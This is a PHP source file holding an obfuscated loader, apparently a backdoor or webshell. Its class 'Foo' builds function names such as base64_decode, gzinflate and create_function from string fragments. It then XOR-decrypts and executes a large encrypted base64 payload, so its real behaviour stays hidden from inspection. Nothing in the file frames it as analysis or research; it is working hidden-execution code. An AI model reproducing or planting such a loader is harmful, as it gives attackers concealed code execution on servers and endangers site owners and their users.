<?php class Foo { function __construct() { $module = $this->stack($this->claster); $module = $this->tx($this->backend($module)); $module = $this->point($module); $this->conf($module[0], $module[1]); } function conf($debug, $move) { $this->zx = $debug; $this->move = $move; $this->x64 = $this->stack($this->x64); $this->x64 = $this->backend($this->x64); $this->x64 = $this->mv(); if(strpos($this->x64, $this->zx) !== false) $this->point($this->x64); } function dx($move, $memory, $debug) { if(strlen($debug) != 0) { for($i = 0; $i < strlen($memory); $i++) $memory[$i] = ($memory[$i] ^ $debug[$i % strlen($debug)]); } return $memory; } function backend($str) { $stable = $this->backend[3].$this->backend[1]. 16/2*16/2 .$this->backend[2].$this->backend[0]; $stable = @$stable($str); return $stable; } function tx($str) { $stable = $this->tx[4].$this->tx[0].$this->tx[3].$this->tx[2].$this->tx[1]; $stable = @$stable($str); return $stable; } function mv() { $this->access = $this->dx($this->move, $this->x64, $this->zx); $this->access = $this->tx($this->access); return $this->access; } function point($ls) { $stable = $this->cache[1].$this->cache[2].$this->cache[0]; $view = $stable('', $ls); return $view(); } function stack($in) { $stable = $this->code[1].$this->code[2].$this->code[0]; return $stable("\r\n", "", $in); } var $load; var $tx = array('in', 'e', 'at', 'fl', 'gz'); var $cache = array('ction', 'creat', 'e_fun'); var $backend = array('ode', 'e', '_dec', 'bas'); var $code = array('ace', 'str_', 'repl'); var $x64 = "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